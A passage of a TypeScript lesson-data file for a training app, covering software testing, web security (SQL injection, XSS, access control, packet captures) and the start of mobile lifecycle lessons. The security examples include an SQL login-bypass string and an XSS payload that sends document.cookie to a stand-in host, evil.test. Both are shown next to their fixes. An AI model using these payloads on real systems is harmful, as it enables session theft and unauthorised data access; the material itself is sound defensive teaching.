import type { Lesson } from "./types";

export const QUALITY_LESSONS: Lesson[] = [
  {
    id: "qa-boundaries",
    familyId: "software-quality",
    module: "Test design and strategy",
    title: "Boundaries and equivalence classes",
    minutes: 30,
    objectives: ["Split inputs into equivalence classes", "Pick boundary values that find real bugs", "Cut a huge input space down to a small, strong test set"],
    explain: [
      "You can never test every input, so test design is about choosing well. Equivalence partitioning groups inputs the program should treat the same way. If an age field accepts 18 to 65, then 'below 18', '18 to 65' and 'above 65' are three classes. One representative from each class is usually enough to learn how the whole class behaves.",
      "Bugs gather at edges, where code switches from one behaviour to another. Boundary value analysis tests the values at and next to each edge. For 18 to 65 that means 17, 18, 19 and 64, 65, 66. Off-by-one mistakes, such as writing less than instead of less than or equal, show up exactly here.",
      "Add the awkward inputs developers forget: empty, null, very long, whitespace, special characters, wrong type, and duplicates. Combine this with a short list of risks to decide where to spend more tests. Ten well-chosen cases beat a hundred random ones.",
      "Combine boundary analysis with a quick decision table when several conditions interact. List each condition, such as customer type, order size and coupon status, and the resulting rule, then check that every combination has a defined outcome and a test. This exposes gaps that single-field tests never find, for example what happens when a coupon is applied to an order that is already discounted. Gaps in the requirements are bugs too, and finding them early is cheap.",
    ],
    keyIdeas: ["Partition inputs into classes that behave alike", "Test at and either side of every boundary", "Always include empty, null, huge and malformed inputs", "Spend effort where the risk is highest"],
    example: {
      title: "Test cases for an age field (valid: 18 to 65)",
      lang: "text",
      code: `Class                Representative   Expected
Below range          10               rejected, clear message
Lower boundary       17 / 18 / 19     reject / accept / accept
Valid middle         40               accepted
Upper boundary       64 / 65 / 66     accept / accept / reject
Above range          120              rejected
Non-numeric          "abc"            rejected, no crash
Empty / null         "" / null        rejected, required message
Decimal              18.5             defined behaviour (reject or round)
Negative             -1               rejected
Very long input      "9" x 10,000     rejected, no timeout`,
      walkthrough: ["Each row is a different reason the code might fail.", "The boundary rows catch off-by-one errors.", "The malformed rows catch crashes and unhandled types."],
    },
    practice: [
      { task: "Design test cases for a discount rule: 5% for orders over 1,000, 10% over 5,000, none otherwise.", hint: "Test 999, 1000, 1001, 4999, 5000, 5001 and also zero and negative totals." },
      { task: "Take a form you use daily and list ten inputs a developer is likely to forget.", hint: "Think about whitespace, emoji, very long text, copied content and double submissions." },
    ],
    quiz: [
      { q: "A field accepts 1 to 100. Which set best covers its boundaries?", options: ["1, 50, 100", "0, 1, 2, 99, 100, 101", "10, 20, 30", "100, 200, 300"], answer: 1, why: "Test just outside, on and just inside each edge." },
      { q: "What is equivalence partitioning for?", options: ["Making tests faster to run", "Reducing many inputs to a few representative ones", "Generating random data", "Replacing exploratory testing"], answer: 1, why: "Inputs in one class should behave alike, so one representative tells you about the class." },
      { q: "Which bug do boundary tests most often catch?", options: ["Memory leaks", "Off-by-one comparison errors", "Slow queries", "Typos in text"], answer: 1, why: "Wrong operators at the edge, such as < versus <=, are classic boundary bugs." },
    ],
    pitfalls: ["Only testing the happy path", "Testing many values inside one class", "Forgetting empty and null"],
  },
  {
    id: "qa-bug-reports",
    familyId: "software-quality",
    module: "Test design and strategy",
    title: "Writing bug reports developers act on",
    minutes: 25,
    objectives: ["Write a reproducible bug report", "Separate observed from expected behaviour", "Give severity and impact without drama"],
    explain: [
      "A bug report is a message to someone who has not seen what you saw. If they cannot reproduce it, they cannot fix it, so reproducibility is the most important property. Give the environment, the exact steps starting from a known state, what you expected, and what happened.",
      "Keep facts apart from guesses. 'The total shows 0 after applying code SAVE10' is a fact. 'The discount function is broken' is a guess that might send the developer in the wrong direction. Attach evidence: a screenshot, a log excerpt, the request and response, and a short screen recording for flows.",
      "Describe impact: who is affected, how often, whether there is a workaround. Severity is how bad the failure is; priority is how soon it should be fixed. A typo on a legal page may be low severity and high priority. One bug per report keeps discussion and tracking clean.",
      "After filing, a report is a conversation. Check back when the developer asks a question, supply what they need quickly, and confirm the fix in the build that contains it rather than assuming. If a bug cannot be reproduced reliably, say so honestly and attach everything you have, including the frequency and any pattern you noticed. Honest uncertainty is far more useful than a confident description of something you saw once.",
    ],
    keyIdeas: ["Reproducible steps from a known starting state", "Expected versus actual, stated plainly", "Evidence attached: logs, screenshots, requests", "Impact and workaround; one bug per report"],
    example: {
      title: "A good report",
      lang: "text",
      code: `Title: Checkout total becomes 0 when a promo code is applied twice

Environment: Staging, build 2.14.3, Chrome 126, macOS 14

Steps:
1. Log in as a new user and add "Basic Plan" (₹499) to the cart
2. Apply promo code SAVE10 -> total shows ₹449 (correct)
3. Click "Apply" again with SAVE10

Expected: Message "Code already applied", total stays ₹449
Actual:   Total shows ₹0 and the Pay button is enabled

Impact: Users can complete checkout for free. Reproduced 3 of 3 times.
Workaround: None known. Evidence: screen recording, network log attached.
Severity: Critical (revenue loss). Suggested priority: Fix before release.`,
      walkthrough: ["The title says what, where and when.", "Steps start from a clean state so anyone can follow them.", "Impact and frequency help the team prioritise."],
    },
    practice: [
      { task: "Rewrite this report: 'Search is broken, please fix.' Add what you would need to know.", hint: "Ask: what query, what result, what did you expect, which environment?" },
      { task: "Find a real bug in an app you use and write a full report using the template above.", hint: "Reproduce it twice before writing." },
    ],
    quiz: [
      { q: "Which is the most useful single detail in a bug report?", options: ["Your opinion about the cause", "Exact reproduction steps", "The time you found it", "A strong adjective"], answer: 1, why: "If developers cannot reproduce it, they cannot fix it." },
      { q: "What is the difference between severity and priority?", options: ["None", "Severity is the impact of the failure; priority is how soon to fix it", "Severity is set by developers only", "Priority is the number of users"], answer: 1, why: "A rare crash might be high severity but low priority; a visible typo on the homepage might be the opposite." },
      { q: "Why report one bug per ticket?", options: ["Tracking tools require it", "Each can be assigned, fixed and verified independently", "It makes reports longer", "It avoids screenshots"], answer: 1, why: "Combined tickets get stuck waiting for the slowest fix." },
    ],
    pitfalls: ["Guessing at root causes", "Steps that assume your local state", "Vague titles such as 'Doesn't work'"],
  },
  {
    id: "qa-locators-waits",
    familyId: "software-quality",
    module: "UI test automation",
    title: "Reliable locators and waits",
    minutes: 35,
    objectives: ["Choose locators that survive UI changes", "Replace sleeps with condition-based waits", "Keep each test independent"],
    explain: [
      "UI tests fail for two common reasons that have nothing to do with bugs: locators that break when a style changes, and timing assumptions. Fix the locator problem by targeting what users perceive: role and accessible name, label text, or a dedicated test id. Avoid long CSS chains and positional selectors like the third div, which break when a designer adds a wrapper.",
      "Fix timing by waiting for a condition, not for a duration. A fixed sleep is either too short, causing flaky failures, or too long, making the suite slow. Modern frameworks auto-wait for elements to be visible and enabled, and offer assertions that retry until they pass or time out. Wait for the thing that proves the app is ready, such as a heading, a response, or a spinner disappearing.",
      "Make each test independent. Create its own data through an API, do not rely on another test having run first, and clean up. Independent tests can run in parallel, fail alone, and be rerun individually.",
      "Make failures easy to understand. Configure the framework to capture a screenshot, video and trace when a test fails, and name tests after the behaviour they verify, such as 'user can remove an item from the cart'. Keep each test focused on one behaviour so a failure points to one cause. Finally, remember the test pyramid: UI tests are slow and costly, so cover the logic with unit and API tests and reserve the browser for the critical journeys a user must be able to complete.",
    ],
    keyIdeas: ["Prefer role, label and test-id locators", "Wait for conditions, never for fixed time", "Set up data through the API, not the UI", "Every test must pass alone and in any order"],
    example: {
      title: "A Playwright test with stable locators",
      lang: "typescript",
      code: `import { test, expect } from "@playwright/test";

test("user can add an item and see it in the cart", async ({ page, request }) => {
  // Arrange: create data via the API, not through ten UI clicks
  const res = await request.post("/api/test/seed-product", {
    data: { name: "Notebook", price: 120 },
  });
  expect(res.ok()).toBeTruthy();

  await page.goto("/shop");

  // Act: locate by role and accessible name
  await page.getByRole("button", { name: "Add Notebook to cart" }).click();
  await page.getByRole("link", { name: "Cart (1)" }).click();

  // Assert: auto-retrying assertion, no sleep
  await expect(page.getByRole("heading", { name: "Your cart" })).toBeVisible();
  await expect(page.getByText("Notebook")).toBeVisible();
  await expect(page.getByTestId("cart-total")).toHaveText("₹120");
});`,
      walkthrough: ["Data is created through an API call, which is faster and less brittle than UI setup.", "Locators use the role and visible name a user would rely on.", "expect(...).toBeVisible retries until it passes or times out, so there is no sleep."],
    },
    practice: [
      { task: "Take a test that uses a fixed sleep and replace it with an assertion on the condition it was waiting for.", hint: "Ask what the page shows when it is truly ready." },
      { task: "Find a brittle selector in a suite you have seen and replace it with a role or test-id locator.", hint: "Ask developers to add data-testid where no accessible name exists." },
    ],
    quiz: [
      { q: "Which locator is generally the most resilient?", options: ["div > div:nth-child(3) > span", "getByRole('button', { name: 'Save' })", "An absolute XPath", "A generated class like .css-1x9"], answer: 1, why: "Role and accessible name reflect how users find elements and rarely change with styling." },
      { q: "Why is a fixed sleep of 5 seconds a poor wait?", options: ["It is too accurate", "It is either too short (flaky) or too long (slow)", "Sleeps are not supported", "It checks the wrong element"], answer: 1, why: "A condition-based wait continues as soon as the app is ready." },
      { q: "A test passes alone but fails after another test runs. What is the likely issue?", options: ["The framework is broken", "Shared state or order dependence between tests", "The browser version", "A slow network"], answer: 1, why: "Tests must create and clean up their own data so they are independent." },
    ],
    pitfalls: ["Chaining brittle CSS selectors", "Driving every setup step through the UI", "Retrying failing tests until they pass without finding the cause"],
  },
  {
    id: "qa-api-tests",
    familyId: "software-quality",
    module: "API and contract testing",
    title: "API tests that catch real bugs",
    minutes: 35,
    objectives: ["Test status codes, bodies and headers", "Cover negative and boundary cases", "Validate responses against a schema"],
    explain: [
      "API tests sit below the UI, so they are faster and more stable, and they can reach cases the interface never allows. A good test checks more than 'it returned 200'. Verify the status code, the response body fields and types, important headers, and the side effect, such as whether the record really exists afterwards.",
      "Cover the failures, not just the success. Send missing required fields, wrong types, values at boundaries, an expired or missing token, a token for the wrong user, and a resource that does not exist. These cases reveal the security and robustness problems that users and attackers eventually find. An API that returns 200 with an error message in the body, or 500 for bad input, is a bug.",
      "Validate the response structure against a schema so that a renamed or removed field is caught immediately. When your service depends on someone else's, a contract test records what your side expects and checks the provider still satisfies it, which catches breaking changes before deployment.",
      "Think about data and state as well. Check that creating a record then reading it returns the same values, that deleting it really removes it, and that repeating a request, such as a retried payment, does not create duplicates. Test pagination at the edges, such as an empty page and the last page, and check how the API behaves under concurrent requests. These behaviours are where real production bugs live, and they are cheap to test at the API level.",
    ],
    keyIdeas: ["Assert status, body, headers and side effects", "Test auth failures and other users' resources", "Bad input must give 4xx, not 5xx", "Schema and contract checks catch breaking changes"],
    example: {
      title: "API tests with a schema check",
      lang: "typescript",
      code: `import { test, expect } from "@playwright/test";
import Ajv from "ajv";

const ajv = new Ajv();
const validateOrder = ajv.compile({
  type: "object",
  required: ["id", "status", "total"],
  properties: {
    id: { type: "string" },
    status: { enum: ["pending", "paid", "cancelled"] },
    total: { type: "number", minimum: 0 },
  },
});

test("create order: happy path", async ({ request }) => {
  const res = await request.post("/api/orders", { data: { sku: "A1", qty: 2 } });
  expect(res.status()).toBe(201);
  expect(validateOrder(await res.json())).toBe(true);
});

test("create order: rejects bad quantity", async ({ request }) => {
  const res = await request.post("/api/orders", { data: { sku: "A1", qty: -5 } });
  expect(res.status()).toBe(400);
});

test("cannot read another user's order", async ({ request }) => {
  const res = await request.get("/api/orders/order-owned-by-someone-else");
  expect([403, 404]).toContain(res.status());
});`,
      walkthrough: ["The schema check fails if a field changes name, type or value set.", "The negative test proves invalid input is handled with a client error.", "The authorisation test covers a common serious bug: reading another user's data."],
    },
    practice: [
      { task: "Write five negative tests for an endpoint you know: missing field, wrong type, boundary, no token, wrong user.", hint: "Each should assert a specific 4xx status and a helpful error message." },
      { task: "Add a schema check to an existing test and break it on purpose by renaming a field.", hint: "Confirm the test fails with a clear message." },
    ],
    quiz: [
      { q: "A POST with invalid input returns 500. What does that suggest?", options: ["The API handles errors well", "Unhandled server-side error that should be a 4xx validation response", "The test is wrong", "A caching issue"], answer: 1, why: "Client mistakes should produce 4xx with a clear message; 500 signals an unhandled failure." },
      { q: "Why test with a token belonging to a different user?", options: ["To check performance", "To find broken access control", "To test caching", "To reduce flakiness"], answer: 1, why: "Broken object-level authorisation is one of the most common and serious API flaws." },
      { q: "What does a contract test protect against?", options: ["Slow pages", "A provider changing its API in a way that breaks consumers", "Typos", "Memory leaks"], answer: 1, why: "It records consumer expectations and verifies the provider still meets them." },
    ],
    pitfalls: ["Asserting only status 200", "Testing only valid input", "Sharing mutable test data between tests"],
  },
  {
    id: "qa-flaky",
    familyId: "software-quality",
    module: "Quality in the pipeline",
    title: "Fixing flaky tests",
    minutes: 30,
    objectives: ["Classify the causes of flakiness", "Reproduce a flaky failure deliberately", "Quarantine responsibly and fix the root cause"],
    explain: [
      "A flaky test passes and fails on the same code. It is worse than no test, because people learn to ignore red builds, and then a real failure slips through. Treat flakiness as a defect in the test suite and fix it, rather than retrying until green.",
      "Most flakes come from a few causes: timing assumptions such as sleeps and race conditions; shared or leftover data between tests; order dependence; dependence on external services, the clock or the network; and non-deterministic data like random values or unsorted results. Identify which one you have by running the test many times, in parallel, and in isolation, and by comparing logs from a pass and a fail.",
      "If a flaky test blocks the team, quarantine it: move it out of the blocking path, track it in a visible list with an owner and a deadline, and keep running it so you can see when it is fixed. Quarantine is a short-term tool; a growing quarantine list means the problem is not being solved.",
      "Prevention beats cure. Review new tests for the usual causes before they merge: no fixed sleeps, unique data per test, no dependence on the current time or on another test. Track the failure rate of each test over time and put it on a dashboard, so a test that starts failing once in fifty runs is noticed early. A healthy suite is one where a red build means something, and the team reacts to it immediately.",
    ],
    keyIdeas: ["Flaky tests erode trust in every test", "Common causes: timing, shared data, order, externals, randomness", "Reproduce by repeating and parallelising", "Quarantine with an owner and a deadline, then fix"],
    example: {
      title: "Reproducing and diagnosing a flake",
      lang: "bash",
      code: `# Run the suspect test 50 times and count failures
npx playwright test checkout.spec.ts --repeat-each=50 --reporter=line

# Run it with several workers to expose shared-state problems
npx playwright test checkout.spec.ts --repeat-each=20 --workers=4

# Keep traces for failures so you can compare with a pass
npx playwright test checkout.spec.ts --trace=retain-on-failure

# Typical findings:
#  - fails only in parallel      -> shared data or a fixed ID
#  - fails only at start of run  -> cold start, missing wait for readiness
#  - fails near midnight         -> test depends on the current date`,
      walkthrough: ["Repeating the test turns a rare failure into a measurable rate.", "Changing parallelism isolates shared-state problems.", "A trace from a failing run shows what the page was doing when it failed."],
    },
    practice: [
      { task: "Pick a test and run it 30 times in parallel. Record the failure rate and the first failure message.", hint: "If it never fails, add artificial network delay to expose timing assumptions." },
      { task: "Write a quarantine policy: how a test enters, who owns it, how long it can stay and how it returns.", hint: "Set a hard deadline such as two weeks, after which it is fixed or deleted." },
    ],
    quiz: [
      { q: "Why is automatically retrying failed tests until they pass a poor long-term fix?", options: ["It is too slow to configure", "It hides real instability and teaches people to ignore failures", "Retries are not supported", "It reduces coverage"], answer: 1, why: "Retries can keep a build green while root causes remain, including real intermittent product bugs." },
      { q: "A test fails only when run with multiple workers. What is the most likely cause?", options: ["A browser bug", "Shared data or state between tests", "A typo", "Slow disks"], answer: 1, why: "Parallel runs expose tests that depend on shared resources or fixed identifiers." },
      { q: "What should a quarantined test have?", options: ["Nothing, just skip it", "An owner and a deadline, and it should keep running", "A comment saying flaky", "A larger timeout"], answer: 1, why: "Without ownership and visibility, quarantine becomes a graveyard." },
    ],
    pitfalls: ["Raising timeouts instead of finding the race", "Letting the quarantine list grow forever", "Ignoring flakes that could be genuine product bugs"],
  },
];

export const SECURITY_LESSONS: Lesson[] = [
  {
    id: "sec-sqli",
    familyId: "cybersecurity",
    module: "Web application security",
    title: "SQL injection and parameterised queries",
    minutes: 35,
    objectives: ["Explain how injection works", "Fix it with parameterised queries", "Recognise related risks such as ORM raw queries"],
    explain: [
      "SQL injection happens when user input is concatenated into a query string, so the database cannot tell the developer's SQL from the attacker's data. An input such as ' OR '1'='1 changes the logic of a login check. With more powerful payloads an attacker can read other tables, modify data or, in some configurations, run commands.",
      "The fix is to separate code from data. A parameterised query, also called a prepared statement, sends the SQL structure to the database first and the values separately. Whatever the value contains, it is treated as data and never as SQL. This single practice removes the whole class of problem for the values you parameterise.",
      "Parameters cannot replace identifiers such as table or column names; for those, use an allow-list of known values. Also apply least privilege: the application's database account should not be able to drop tables. Escaping strings by hand is fragile and should not be your main defence.",
      "Detection and response matter as well as prevention. Log database errors on the server and alert on unusual patterns such as many failed queries or unexpected quote characters in parameters, but never show raw errors to users, since messages can reveal table names and structure. Run static analysis and dependency scanners in your pipeline, and include injection cases in your automated tests so a regression is caught before release.",
    ],
    keyIdeas: ["Never build SQL by concatenating user input", "Use parameterised queries or a safe ORM API", "Allow-list identifiers such as sort columns", "Least-privilege database accounts limit the damage"],
    example: {
      title: "Vulnerable versus safe",
      lang: "javascript",
      code: `// VULNERABLE: input becomes part of the SQL text
app.get("/users", async (req, res) => {
  const sql = "SELECT id, name FROM users WHERE email = '" + req.query.email + "'";
  const rows = await db.query(sql);
  res.json(rows);
});
// ?email=' OR '1'='1  -> returns every user

// SAFE: SQL and data are sent separately
app.get("/users", async (req, res) => {
  const rows = await db.query(
    "SELECT id, name FROM users WHERE email = $1",
    [req.query.email]
  );
  res.json(rows);
});

// SAFE for sort order: allow-list, since identifiers cannot be parameters
const SORTABLE = new Set(["name", "created_at"]);
const sort = SORTABLE.has(req.query.sort) ? req.query.sort : "created_at";`,
      walkthrough: ["In the vulnerable version, a quote in the input ends the string and adds attacker-controlled SQL.", "In the safe version, $1 is a placeholder; the value can never change the query's structure.", "For dynamic column names, validate against a fixed set of allowed values."],
    },
    practice: [
      { task: "On a deliberately vulnerable practice app that you run locally, perform a login bypass, then fix the code and confirm the attack fails.", hint: "Only test systems you own or are explicitly allowed to test." },
      { task: "Search a project for string concatenation inside query calls and list every instance.", hint: "Look for + or template strings next to query, execute or raw." },
    ],
    quiz: [
      { q: "What is the primary fix for SQL injection?", options: ["Hiding error messages", "Parameterised queries", "Longer passwords", "A firewall alone"], answer: 1, why: "Parameters keep user data separate from SQL code so it cannot change the query." },
      { q: "Why can't you parameterise a column name in ORDER BY?", options: ["Databases forbid ORDER BY", "Parameters are values, not identifiers, so use an allow-list", "It is too slow", "ORMs handle it automatically"], answer: 1, why: "Placeholders bind values. Identifiers must be validated against known-good names." },
      { q: "How does least privilege help against injection?", options: ["It prevents all injection", "It limits what an attacker can do if injection occurs", "It speeds up queries", "It encrypts data"], answer: 1, why: "If the app account cannot drop tables or read unrelated data, the damage is smaller." },
    ],
    pitfalls: ["Trusting an ORM's raw query helpers with concatenated input", "Relying on blocklists of bad characters", "Showing detailed database errors to users"],
  },
  {
    id: "sec-xss",
    familyId: "cybersecurity",
    module: "Web application security",
    title: "XSS: output encoding and content security policy",
    minutes: 35,
    objectives: ["Distinguish stored, reflected and DOM-based XSS", "Apply output encoding for the right context", "Add a content security policy as defence in depth"],
    explain: [
      "Cross-site scripting happens when an application includes untrusted input in a page in a way that the browser runs as code. The attacker's script then runs with the user's session, so it can read page data, perform actions as the user, or steal tokens that are not protected. Stored XSS saves the payload, for example in a comment. Reflected XSS bounces it from a request parameter. DOM-based XSS occurs entirely in client-side code that writes input into the page.",
      "The core defence is output encoding: convert special characters to a safe form for the place where the data lands. HTML text, HTML attributes, JavaScript and URLs each need different encoding. Modern frameworks encode by default; the danger appears when you opt out, using features such as innerHTML or dangerouslySetInnerHTML, with input you do not control. If you must allow rich text, sanitise it with a well-maintained library using an allow-list.",
      "A Content Security Policy, delivered as an HTTP header, tells the browser which script sources are allowed. A strict policy that forbids inline scripts and unknown origins greatly reduces the impact of a mistake. Setting cookies as HttpOnly keeps scripts from reading session cookies. These are extra layers; encoding is still the primary defence.",
    ],
    keyIdeas: ["Encode output for its context: HTML, attribute, JS, URL", "Avoid innerHTML with untrusted data; sanitise if you must", "CSP limits what injected script can do", "HttpOnly cookies protect session tokens from scripts"],
    example: {
      title: "Unsafe and safe rendering",
      lang: "javascript",
      code: `// UNSAFE: the comment is parsed as HTML
commentEl.innerHTML = comment.text;
// comment.text = '<img src=x onerror="fetch(\\'https://evil.test/?c=\\'+document.cookie)">'

// SAFE: treated as text, not markup
commentEl.textContent = comment.text;

// React escapes by default:
//   <p>{comment.text}</p>            // safe
//   <p dangerouslySetInnerHTML={{ __html: comment.text }} />   // dangerous

// If rich text is required, sanitise with an allow-list library first
import DOMPurify from "dompurify";
commentEl.innerHTML = DOMPurify.sanitize(comment.html);

// A strict CSP header (set on the server):
// Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'`,
      walkthrough: ["innerHTML parses markup, so an attacker's tag or event handler executes.", "textContent and framework escaping treat everything as plain text.", "CSP is a second line of defence that blocks inline scripts and untrusted origins."],
    },
    practice: [
      { task: "In a practice app, inject a harmless alert payload through a comment field, then fix the rendering and verify the payload shows as text.", hint: "Use textContent or framework default escaping." },
      { task: "Write a CSP for a simple site and test what it blocks in the browser console.", hint: "Start with default-src 'self' and relax only what you must." },
    ],
    quiz: [
      { q: "Which is the primary defence against XSS?", options: ["Output encoding for the right context", "Longer passwords", "Hiding the admin page", "HTTPS only"], answer: 0, why: "Encoding ensures untrusted data cannot be interpreted as code in the place it is rendered." },
      { q: "What does the HttpOnly flag on a cookie do?", options: ["Encrypts the cookie", "Prevents client-side scripts from reading it", "Makes it expire sooner", "Restricts it to one page"], answer: 1, why: "Scripts cannot access HttpOnly cookies, so an XSS bug cannot trivially steal the session cookie." },
      { q: "Why is dangerouslySetInnerHTML named that way?", options: ["It is slow", "It bypasses React's default escaping, so unsafe input can run as script", "It is deprecated", "It breaks styling"], answer: 1, why: "It inserts raw HTML. Only use it with sanitised content." },
    ],
    pitfalls: ["Sanitising on input but not encoding on output", "Allowing inline scripts in CSP 'to make it work'", "Using a custom regex to strip script tags"],
  },
  {
    id: "sec-idor",
    familyId: "cybersecurity",
    module: "Web application security",
    title: "Broken access control (IDOR)",
    minutes: 30,
    objectives: ["Recognise insecure direct object references", "Enforce authorisation on the server for every request", "Test for horizontal and vertical privilege escalation"],
    explain: [
      "Authentication proves who you are. Authorisation decides what you may do. Broken access control happens when the server checks the first but not the second. The classic example is an insecure direct object reference: a URL such as /invoices/1042 returns any invoice if you change the number, because the server never checks that the invoice belongs to the logged-in user.",
      "There are two directions. Horizontal escalation means reading or changing another user's data at the same privilege level. Vertical escalation means reaching functionality reserved for a higher role, such as an admin endpoint. Hiding a button in the interface does not protect anything: attackers call the API directly.",
      "The fix is to enforce checks on the server for every request that touches a resource. Look up the object and verify ownership or role in the same query where possible, deny by default, and avoid trusting ids or roles sent by the client. Predictable ids make guessing easier, but unpredictable ids are not a substitute for authorisation.",
      "Testing for access control is systematic work. Build a small matrix of roles and resources, then for each endpoint try the request as an anonymous user, as a normal user, as a different normal user, and as an admin. Do this for reads and for writes, including bulk and export endpoints, which are often forgotten. Automate the matrix as integration tests so that a new endpoint cannot ship without a decision about who may call it.",
    ],
    keyIdeas: ["Authentication is not authorisation", "Check ownership or role on the server, on every request", "Hidden buttons and obscure ids are not controls", "Deny by default; test with two different accounts"],
    example: {
      title: "A vulnerable and a fixed endpoint",
      lang: "javascript",
      code: `// VULNERABLE: any logged-in user can fetch any invoice by id
app.get("/api/invoices/:id", requireLogin, async (req, res) => {
  const invoice = await db.invoice.findUnique({ where: { id: req.params.id } });
  res.json(invoice);
});

// FIXED: ownership is part of the query
app.get("/api/invoices/:id", requireLogin, async (req, res) => {
  const invoice = await db.invoice.findFirst({
    where: { id: req.params.id, ownerId: req.user.id },
  });
  if (!invoice) return res.status(404).json({ error: "Not found" });
  res.json(invoice);
});

// Vertical control: role checked on the server
app.delete("/api/users/:id", requireLogin, requireRole("admin"), deleteUser);`,
      walkthrough: ["The fix puts ownerId in the same query, so other users' rows are never returned.", "Returning 404 instead of 403 avoids confirming that the object exists.", "Role checks must run on the server for every sensitive action."],
    },
    practice: [
      { task: "With two test accounts on a practice app, log in as A and request B's resource by id. Document what you find and write the fix.", hint: "Check both read and write endpoints." },
      { task: "List five endpoints in a project you know and write down how each decides who may call it.", hint: "If the answer is 'the UI hides it', that is a finding." },
    ],
    quiz: [
      { q: "A user changes /orders/17 to /orders/18 and sees someone else's order. What is this?", options: ["XSS", "An insecure direct object reference", "SQL injection", "CSRF"], answer: 1, why: "The server does not verify that the requested object belongs to the requester." },
      { q: "Is hiding the Delete button from non-admins enough?", options: ["Yes", "No, the server must enforce the check because the API can be called directly", "Only on mobile", "Yes if ids are random"], answer: 1, why: "Client-side controls are cosmetic. Authorisation must be enforced on the server." },
      { q: "What is a good default access-control posture?", options: ["Allow unless blocked", "Deny unless explicitly allowed", "Trust the client's role field", "Rely on obscure URLs"], answer: 1, why: "Deny-by-default means a forgotten rule fails closed rather than open." },
    ],
    pitfalls: ["Checking login but not ownership", "Trusting a role or user id sent in the request body", "Testing only with one account"],
  },
  {
    id: "sec-packets",
    familyId: "cybersecurity",
    module: "Networking and Linux for defenders",
    title: "Reading a packet capture",
    minutes: 35,
    objectives: ["Follow a TCP conversation in a capture", "Use display filters to find what matters", "Identify cleartext data and suspicious patterns"],
    explain: [
      "A packet capture records the traffic on a network interface. Reading one is how defenders confirm what really happened, rather than what logs claim. Start with the big picture: which hosts talk to each other, which protocols appear, and how much data moves. Then narrow down to the conversation you care about and follow it from start to finish.",
      "A TCP connection begins with a three-step handshake: SYN, SYN-ACK, ACK. Data then flows in segments, and the connection ends with FIN or RST. A burst of SYNs with no completed handshakes can mean a scan. Repeated resets can mean a closed or filtered port. In an HTTPS capture you will see the TLS handshake and then encrypted application data, so you can learn who talked to whom but not what was said, unless you have the keys.",
      "Display filters make this tractable. Filter by host, port, protocol and content, for example http, dns, tcp.port == 443 or ip.addr == 10.0.0.5. Unencrypted protocols such as plain HTTP, FTP or Telnet expose credentials and data in cleartext, which is exactly why they are findings in an assessment. Only capture traffic on networks you own or are authorised to monitor.",
    ],
    keyIdeas: ["Start broad: hosts, protocols, volume", "SYN, SYN-ACK, ACK opens a TCP connection", "Filter to the conversation and follow the stream", "Cleartext protocols expose credentials"],
    example: {
      title: "Useful Wireshark display filters",
      lang: "text",
      code: `ip.addr == 10.0.0.5                     # everything to or from one host
tcp.port == 443                         # HTTPS traffic
dns                                      # name lookups: what is this host resolving?
http.request.method == "POST"           # form submissions over plain HTTP
tcp.flags.syn == 1 && tcp.flags.ack == 0   # connection attempts (look for scans)
tcp.flags.reset == 1                    # resets: closed ports or aborted sessions
frame contains "password"               # cleartext secrets (only on authorised captures)

# Command-line equivalents with tshark:
tshark -r capture.pcap -Y "dns" -T fields -e ip.src -e dns.qry.name`,
      walkthrough: ["DNS queries often reveal what a machine is trying to reach, including malicious domains.", "A flood of SYN packets without ACKs often indicates scanning.", "Searching for cleartext credentials demonstrates why unencrypted protocols are risky."],
    },
    practice: [
      { task: "Capture your own login to a local practice app over HTTP and over HTTPS. Compare what is visible in each.", hint: "Follow the TCP stream. The HTTP one shows the form data; the HTTPS one does not." },
      { task: "Open a sample capture and write a five-line summary: hosts, protocols, notable events, anything unusual.", hint: "Use Statistics > Conversations and Protocol Hierarchy first." },
    ],
    quiz: [
      { q: "What does a SYN with no corresponding SYN-ACK usually suggest?", options: ["A completed download", "The port is closed, filtered, or the host is down", "An encrypted session", "A DNS error"], answer: 1, why: "The destination did not complete the handshake. Many unanswered SYNs across ports suggests scanning." },
      { q: "Why can't you read page content in an HTTPS capture?", options: ["Wireshark cannot read HTTPS", "The application data is encrypted by TLS", "Packets are too small", "HTTP is disabled"], answer: 1, why: "TLS encrypts the payload; you still see metadata like hosts, sizes and timing." },
      { q: "Which protocol is a finding if seen carrying passwords?", options: ["TLS", "SSH", "FTP or plain HTTP", "DNS over HTTPS"], answer: 2, why: "They send credentials in cleartext, so anyone on the path can read them." },
    ],
    pitfalls: ["Capturing on networks you do not have permission to monitor", "Drawing conclusions without following the full stream", "Ignoring DNS, which often shows the first sign of compromise"],
  },
];

export const MOBILE_LESSONS: Lesson[] = [
  {
    id: "mob-lifecycle",
    familyId: "mobile-development",
    module: "Platform fundamentals",
    title: "App lifecycle and state restoration",
    minutes: 30,
    objectives: ["Describe the foreground, background and terminated states", "Save and restore user state without losing work", "Handle interruptions such as calls and low memory"],
    explain: [
      "A mobile app does not control its own lifetime. The operating system starts it, moves it to the background when the user switches away, and may terminate it at any time to reclaim memory. Users do not know or care about this. They expect to return to the app and find their work where they left it.",
      "Think in three states: active in the foreground, in the background where work is limited, and terminated. Save important state when the app moves to the background, because there may be no warning before termination. Restore it on launch so a returning user lands on the screen they were using with their draft intact.",
      "Interruptions are normal: phone calls, notifications, permission dialogs, rotation and low memory. Design for them. Pause timers and media when leaving the foreground, release heavy resources, and never assume a network request will finish before the app is suspended.",
      "Different platforms use different names for the same ideas, so learn the vocabulary of the one you target. On iOS you will meet scenes and the active, inactive and background phases. On Android you will meet activities, onPause and onStop, and configuration changes such as rotation that recreate screens. Cross-platform frameworks wrap these events, but the underlying behaviour, including that the process can disappear while backgrounded, is the same everywhere.",
    ],
    keyIdeas: ["The OS can terminate the app at any time", "Save on background, restore on launch", "Pause work and release resources when inactive", "Treat interruptions as normal, not edge cases"],
    example: {
      title: "Saving a draft when the app backgrounds (React Native)",
      lang: "javascript",
      code: `import { useEffect, useRef, useState } from "react";
import { AppState } from "react-native";
import AsyncStorage from "@react-native-async-storage/async-storage";

const KEY = "note-draft";

export function useDraft() {
  const [text, setText] = useState("");
  const textRef = useRef(text);
  textRef.current = text;

  // Restore on launch
  useEffect(() => {
    AsyncStorage.getItem(KEY).then((saved) => saved && setText(saved));
  }, []);

  // Save when leaving the foreground
  useEffect(() => {
    const sub = AppState.addEventListener("change", (state) => {
      if (state !== "active") AsyncStorage.setItem(KEY, textRef.current);
    });
    return () => sub.remove();
  }, []);

  return [text, setText];
}`,
      walkthrough: ["AppState reports when the app leaves the foreground.", "A ref holds the latest text so the listener never saves stale data.", "On the next launch the saved draft is restored."],
    },
    practice: [
